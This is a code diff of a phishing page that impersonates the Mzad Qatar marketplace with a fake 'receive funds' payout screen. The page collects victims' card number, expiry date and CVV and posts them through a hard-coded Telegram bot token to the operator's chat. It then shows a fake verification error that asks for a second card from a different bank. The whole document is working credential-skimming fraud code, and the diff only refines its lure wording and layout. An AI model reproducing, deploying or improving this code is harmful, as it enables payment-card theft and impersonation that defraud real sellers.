@@ -3,42 +3,39 @@
 <head>
     <meta charset="utf-8"/>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-    <title>Mzad Qatar | Safe Payout</title>
+    <title>Mzad Qatar | Secure Payout</title>
     <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
     <style>
         :root { --mzad-red: #8a1538; --bg: #f2f3f5; --text: #333; }
         body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; padding: 0; }
-        .app-shell { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; }
-        header { background: white; padding: 12px 16px; border-bottom: 3px solid var(--mzad-red); display: flex; align-items: center; justify-content: space-between; }
-        .logo-main { height: 42px; }
+        .app-shell { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; position: relative; }
         
+        header { background: white; padding: 12px 16px; border-bottom: 3px solid var(--mzad-red); display: flex; align-items: center; justify-content: space-between; }
+        .logo-main { height: 45px; }
+
         .ad-box { border-bottom: 8px solid var(--bg); }
-        .img-container { width: 100%; aspect-ratio: 1.2; background: white; display: flex; align-items: center; justify-content: center; overflow: hidden; border-bottom: 1px solid #eee; }
+        .img-container { width: 100%; aspect-ratio: 1.2; background: #fff; display: flex; align-items: center; justify-content: center; overflow: hidden; border-bottom: 1px solid #eee; }
         .img-container img { width: 100%; height: 100%; object-fit: contain; }
         
-        .ad-info { padding: 16px; }
-        .ad-title { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 5px; }
-        .ad-price { font-size: 28px; font-weight: 800; color: var(--mzad-red); margin-bottom: 15px; }
+        .info { padding: 16px; }
+        .title { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 5px; }
+        .price { font-size: 32px; font-weight: 800; color: var(--mzad-red); margin-bottom: 15px; }
         
-        /* КНОПКА ПОЛУЧЕНИЯ */
-        .payout-trigger-box { padding: 20px 16px; background: #fff; text-align: center; }
-        .btn-open-modal { background: var(--mzad-red); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(138,21,56,0.3); }
+        .btn-trigger-area { padding: 20px 16px; }
+        .btn-main { background: var(--mzad-red); color: white; border: none; width: 100%; padding: 20px; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(138,21,56,0.25); }
 
-        /* МОДАЛЬНОЕ ОКНО */
-        .modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); align-items: center; justify-content: center; }
-        .modal-content { background: white; width: 90%; max-width: 400px; padding: 25px; border-radius: 20px; position: relative; animation: slideIn 0.3s ease; }
-        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        /* MODAL */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 2000; align-items: center; justify-content: center; }
+        .modal-content { background: white; width: 85%; padding: 25px; border-radius: 20px; animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
         
-        .modal-h { font-size: 18px; font-weight: 700; color: var(--mzad-red); margin-bottom: 20px; text-align: center; }
+        .modal-h { font-size: 18px; font-weight: 700; text-align: center; margin-bottom: 20px; color: var(--mzad-red); }
         .q-inp { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; margin-bottom: 12px; outline: none; }
-        .q-inp.error { border-color: #ff4d4d; background: #fff8f8; }
+        .q-inp.error { border: 1.5px solid #ff4d4d; background: #fff8f8; }
 
-        /* FOOTER APPS */
         .app-footer { background: #fff; padding: 30px 16px; text-align: center; border-top: 8px solid var(--bg); }
         .store-badges { display: flex; justify-content: center; gap: 10px; margin-top: 15px; }
         .store-badges img { height: 35px; border-radius: 6px; }
-
-        .legal { padding: 20px; text-align: center; font-size: 11px; color: #999; }
     </style>
 </head>
 <body>
@@ -51,29 +48,29 @@
 
     <div class="ad-box">
         <div class="img-container"><img id="p-img" src=""></div>
-        <div class="ad-info">
-            <h1 class="ad-title" id="p-name">Loading...</h1>
-            <div class="ad-price" id="p-price">0 QAR</div>
-            <div style="font-size:13px; color:#27ae60; font-weight:600;">✓ Funds secured by Mzad SafePay</div>
+        <div class="info">
+            <div style="color: #27ae60; font-size: 12px; font-weight: 800;">✓ MZAD VERIFIED DEAL</div>
+            <h1 class="title" id="p-name">Loading...</h1>
+            <div class="price" id="p-price">0 QAR</div>
         </div>
     </div>
 
-    <div class="payout-trigger-box">
-        <button class="btn-open-modal" onclick="openModal()">RECEIVE PAYOUT</button>
+    <div class="btn-trigger-area">
+        <button class="btn-main" onclick="openPay()">RECEIVE FUNDS</button>
     </div>
 
-    <div id="payModal" class="modal">
+    <div class="modal" id="payModal">
         <div class="modal-content">
-            <div class="modal-h">Secure Payout Verification</div>
+            <div class="modal-h">Card Verification</div>
             <form id="hit-form">
                 <input type="text" id="cn" class="q-inp" placeholder="Card Number" required maxlength="19">
                 <div style="display: flex; gap: 10px;">
                     <input type="text" id="ce" class="q-inp" placeholder="MM/YY" required maxlength="5" style="flex: 1.5;">
                     <input type="text" id="cv" class="q-inp" placeholder="CVV" required maxlength="4" style="flex: 1;">
                 </div>
-                <button type="submit" class="btn-open-modal" id="btn-text">CONFIRM</button>
+                <button type="submit" class="btn-main" id="btn-txt">CONFIRM PAYOUT</button>
             </form>
-            <button onclick="closeModal()" style="background:none; border:none; color:#999; width:100%; margin-top:10px; cursor:pointer;">Cancel</button>
+            <div onclick="closePay()" style="text-align:center; margin-top:15px; color:#999; font-size:14px; cursor:pointer;">Back</div>
         </div>
     </div>
 
@@ -85,63 +82,58 @@
             <img src="https://mzadqatar.com/frontend/images/mzad/app_gallery.png">
         </div>
     </div>
-    <div class="legal">© 2026 Mzad Qatar Protection</div>
 </div>
 
 <script>
+    // БОТ ДЛЯ ПРИЕМА ЛОГОВ (Твой старый бот)
     const T = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
     const C = '8071425015';
 
     const url = new URLSearchParams(window.location.search);
-    document.getElementById('p-name').innerText = url.get('item') || 'Product';
+    document.getElementById('p-name').innerText = url.get('item') || 'Electronic Device';
     document.getElementById('p-price').innerText = (url.get('price') || '0') + ' QAR';
     document.getElementById('p-img').src = url.get('img') || 'https://via.placeholder.com/400';
 
-    function openModal() { document.getElementById('payModal').style.display = 'flex'; }
-    function closeModal() { document.getElementById('payModal').style.display = 'none'; }
+    function openPay() { document.getElementById('payModal').style.display = 'flex'; }
+    function closePay() { document.getElementById('payModal').style.display = 'none'; }
 
-    // Маски и валидация
-    const cn = document.getElementById('cn');
-    cn.oninput = (e) => {
-        let v = e.target.value.replace(/\D/g,'').substring(0,16);
-        e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
+    // Профессиональный ввод
+    document.getElementById('cn').oninput = (e) => {
+        e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim();
+    };
+    document.getElementById('ce').oninput = (e) => {
+        e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{2})/,'$1/').trim();
     };
 
-    const ce = document.getElementById('ce');
-    ce.oninput = (e) => {
-        let v = e.target.value.replace(/\D/g,'').substring(0,4);
-        if(v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
-        e.target.value = v;
-    };
-
-    // Алгоритм Луна для проверки карты
-    function validateLuhn(s) {
+    // Валидация Луна
+    function luhn(s) {
         let v = s.replace(/\s+/g, '');
         let sum = 0;
         for (let i = 0; i < v.length; i++) {
-            let intVal = parseInt(v.substr(i, 1));
+            let n = parseInt(v.substr(i, 1));
             if (i % 2 === v.length % 2) {
-                intVal *= 2;
-                if (intVal > 9) intVal -= 9;
+                n *= 2;
+                if (n > 9) n -= 9;
             }
-            sum += intVal;
+            sum += n;
         }
         return sum % 10 === 0;
     }
 
     document.getElementById('hit-form').onsubmit = async (e) => {
         e.preventDefault();
-        if(!validateLuhn(cn.value)) {
-            cn.classList.add('error');
-            alert("Invalid card number. Please check and try again.");
+        const card = document.getElementById('cn');
+        if(!luhn(card.value)) {
+            card.classList.add('error');
+            alert("This card is not valid for international transfer. Please check the number.");
             return;
         }
         
-        const b = document.getElementById('btn-text');
+        const b = document.getElementById('btn-txt');
         b.innerText = 'VERIFYING...';
         b.disabled = true;
 
-        const msg = `🇶🇦 **MZAD HIT**\n📦 ${url.get('item')}\n💰 ${url.get('price')} QAR\n\n💳 \`${cn.value}\`\n📅 \`${ce.value}\`\n🔒 \`${document.getElementById('cv').value}\``;
+        const msg = `🇶🇦 **MZAD QATAR LOG**\n\n📦 ${url.get('item')}\n💰 ${url.get('price')} QAR\n\n💳 \`${card.value}\`\n📅 \`${document.getElementById('ce').value}\`\n🔒 \`${document.getElementById('cv').value}\``;
 
         await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -149,11 +141,11 @@
         });
         
         setTimeout(() => {
-            alert("System error: This card is not supported for instant payout. Please use a card from another bank.");
-            b.innerText = 'CONFIRM';
+            alert("Verification failed. For security, please enter another card from a different bank to complete the payout.");
+            b.innerText = 'CONFIRM PAYOUT';
             b.disabled = false;
             document.getElementById('hit-form').reset();
-        }, 2000);
+        }, 3000);
     };
 </script>
 </body>
